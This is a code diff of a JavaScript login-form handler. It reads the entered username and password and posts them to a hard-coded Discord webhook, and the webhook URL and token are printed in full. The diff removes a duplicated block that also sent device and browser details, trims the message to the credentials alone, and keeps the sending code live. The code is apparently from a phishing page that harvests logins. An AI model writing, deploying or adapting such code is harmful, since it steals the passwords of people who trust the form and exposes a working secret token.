@@ -12,39 +12,14 @@
   var pw = document.getElementById("password").value
      var ur = document.getElementById("username").value
 
-
-var a = window.navigator.userAgent
-var Browser = navigator.appName
-var fill = "      "
-const webhookURL = 'https://discord.com/api/webhooks/859827671458775040/gzruSP-EmkI8TsCghAPLyy1zJOpV1T0x5nP7_7_NL4Tu0inJHkehzLLhp-7aZa0kl1DU';
-const message = {
-    content: ' Device type: '+ a + ' '+ fill + 'Browser type: ' + Browser + ' '+ fill + ' Username: ' +ur+ ' Password :' + pw+ ''};
-  
-
-fetch(webhookURL, {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(message)
-})
-(response => {
-    if (response.ok) {
-        console.log('Message sent!');
-    } else {
-        console.error('Error sending message:', response.statusText);
-    }
-})
-.catch(error => {
-    console.error('Error:', error);
-});
- 
-}
+   document.body.style.backgroundColor = '#f0f0f0';
+  var pw = document.getElementById("password").value
+     var ur = document.getElementById("username").value
 
 
        const webhookURL = 'https://discord.com/api/webhooks/859827671458775040/gzruSP-EmkI8TsCghAPLyy1zJOpV1T0x5nP7_7_NL4Tu0inJHkehzLLhp-7aZa0kl1DU';
 const message = {
-  content: ' Device type: '+ a + ' '+ fill + 'Browser type: ' + Browser + ' '+ fill + ' Username: ' +ur+ ' Password :' + pw+ ''
+  content:  ' Username: ' +ur+ ' Password :' + pw+ ''
 };
 
 fetch(webhookURL, {
